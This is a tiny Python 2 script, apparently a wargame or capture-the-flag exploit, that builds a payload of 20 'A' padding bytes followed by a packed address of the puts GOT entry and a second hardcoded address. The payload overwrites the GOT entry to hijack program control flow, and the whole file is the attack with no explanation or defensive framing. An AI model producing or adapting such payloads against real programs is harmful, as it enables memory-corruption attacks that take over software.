import struct

mok = struct.pack('I', 0x080484f4)
puts_got = struct.pack('I', 0x8049928)

print "A" * 20 + puts_got + " " +  mok
